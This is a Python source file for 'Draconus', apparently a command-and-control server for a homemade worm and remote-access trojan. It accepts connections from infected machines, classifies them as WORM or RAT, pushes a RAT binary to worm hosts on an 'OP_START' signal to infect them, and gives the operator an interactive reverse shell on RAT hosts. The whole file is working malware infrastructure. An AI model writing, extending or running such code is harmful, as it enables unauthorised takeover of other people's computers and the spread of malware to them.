import socket
from hive import Queen

# Change this IP for your local network
SERVER = '192.168.100.16'
PORT = 5050
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'

# length of message (256 bytes)
RAW_LEN = 256

# length of response message (1 bytes)
RAW_ERROR = 1

# response message OK ( No Error)
RAW_NoE = '0'.encode(FORMAT)

# types of tools (viruses, rats, worms, etc.)
# Draconus identify types of worms
TYPE_WORM = 'WORM'
TYPE_RAT = 'RAT'

# message to disconnect
MSG_DISC = 'DISCONNECT'


# message to start shell
SHELL_START = 'SHELL START'

# message to exit the shell
SHELL_EXIT = 'EXIT'

# the message that will initiate the infection
OP_START = 'OP_START'

# This class prepare message to send via TCP
class Msg:
    def __init__(self, msg, formats=FORMAT, raw_len=RAW_LEN):
        if msg == '':
            self.pmsg = '0'
        else:
            self.pmsg = msg
        self.formats = formats
        if len(msg) > raw_len:
            self.raw_len = len(msg)
        else:
            self.raw_len = raw_len
        
        self.msg = self.make(self.pmsg)
        self.len = self.make(len(self.pmsg), raw_len=RAW_LEN)
      

    def make(self, msg, raw_len=None):
        nmsg = str(msg).encode(self.formats)
        if len(nmsg) < self.raw_len:
            raw_len = RAW_LEN
        else:
            raw_len = self.raw_len
        while len(nmsg) < raw_len:
            nmsg += b' '
        return nmsg

class Draconus:

    def __init__(self):
        print('[SYSTEM] Draconus starting ...')
        
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # prevent "error 98: adress already in use"
        # can reuse adress
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.server.bind(ADDR)
        self.conn = None
        self.addr = None

        # synergy represent type of connected worm
        self.synergy = None

        self.QUEEN = Queen()
        print(self.QUEEN)
        

    
    # START DRACONUS
    # Each time a connection is made, the worm will be identified

    def start(self):
        self.server.listen(6)
        print('*********************************************************')
        print(f'[DRACONUS] Server listening on {SERVER}')
        while True:
            self.synergy = None
            print('[DRACONUS] ------------------------------------------------')
            print('[DRACONUS] Waiting for connection')
            self.conn, self.addr = self.server.accept()
            print(f'[DRACONUS] New connection from: {self.addr[0]}')

            if self.who_is() == False:
                print('[DRACONUS] Unknown type of worm ')
                print(f'[DRACONUS] Disconnect {self.addr[0]} .... ')
                self.conn.close()
                continue
            
      
            self.handle_WORMS()

        self.conn.close()
        self.server.close()



            

    # recive standard pocket (message) and send response (1 byte)
    # default length is 256 bytes
    def recive_pocket(self):
        try:
            rec = self.conn.recv(RAW_LEN)
        except Exception as e:
            print('[DRACONUS] Error when recive pocket: ', e)
            return 0
        if rec:
            rec = rec.decode(FORMAT).rstrip(' ')
            output = rec

            try:
                self.conn.send(RAW_NoE)
            except Exception as e:
                print('[DRACONUS] Error when send response: ', e)
                return 0
            return output

    # send default pocket (message) to worm and recive response (1 bytes)
    # default length is 256 bytes
    def send_pocket(self, msg):
        send = Msg(msg)
        try:
            self.conn.send(send.msg)
        except:
            pass
        try:
            self.conn.recv(RAW_ERROR)
        except:
            pass


    # Recive a output in 2 steps:
    # first: recive length of message
    # second: recive a message
    def recive_output(self):
        len_out = self.recive_pocket()
        length = int(float(len_out))
        print(f'[DRACONUS] Trying recive {length} bytes')
        output = b''
        while len(output) < length:
            chunk = self.conn.recv(length)
            if not chunk:
                break
            output += chunk
        
        output = output.decode(FORMAT)
        return output
        
            



    
    # Identification of worm type
    def who_is(self):
        who = self.recive_pocket()
        if who:
            if who == TYPE_RAT:
                self.synergy = TYPE_RAT
            elif who == TYPE_WORM:
                self.synergy = TYPE_WORM
            else:
                self.synergy = None
                return False

            print(f'[DRACONUS] This is {self.synergy} !!! ')
            return True



    def show_output(self, output):
        print(f'[DRACONUS] ************** New Message From {self.synergy} ****************')
        print(f'[{self.synergy}] {output} ')
        print('[DRACONUS] **************************************************************')
        return output



    def handle_RAT(self):
        command = None
        while command != MSG_DISC:
            print(f'[DRACONUS] ** Put: {SHELL_START} to start Reverse TCP SHELL')
            print(f'[DRACONUS] ** Put: {MSG_DISC} to Disconnect {self.synergy} ')
            print('-----------------------------------------------------------------')
            print(f'[DRACONUS] Put order to {self.synergy} [{self.addr[0]}]')
            print('[DRACONUS] << ', end='')
            command = input()
            
            self.send_pocket(str(command))
            response = self.recive_pocket()
            self.show_output(response)
            if command == SHELL_START:
                com = None
                while com != SHELL_EXIT:
                    cwd = self.recive_pocket()
                    print(f'[{self.synergy} CWD] {cwd}')
                    print(f'[{self.synergy} SHELL] << ', end='')
                    com = input()
                    self.send_pocket(com)
                    rec = self.recive_output()
                    self.show_output(rec)


            

        print(f'[DRACONUS] Disconnect {self.synergy} - {self.addr[0]} ')

    def handle_worm(self):
        print(f'[DRACONUS] Starting operation with {self.synergy} ')
        rec = self.recive_pocket()
        if rec == OP_START:
            print(f'[DRACONUS] Trying infect {self.addr[0]} ')
            self.send_pocket(self.QUEEN.RAT.length)
            with open(self.QUEEN.RAT.path, 'rb') as f:
                self.conn.sendfile(f, 0)
            response = self.recive_pocket()
            print(f'[{self.synergy}] {response} ')


        else:
            print(f'[Draconus] Unknown command from {self.synergy} ')


    def handle_WORMS(self):
        if self.synergy == TYPE_RAT:
            self.handle_RAT()
        elif self.synergy == TYPE_WORM:
            self.handle_worm()
        else:
            return False

                    




#### START
DRACONUS = Draconus()
DRACONUS.start()

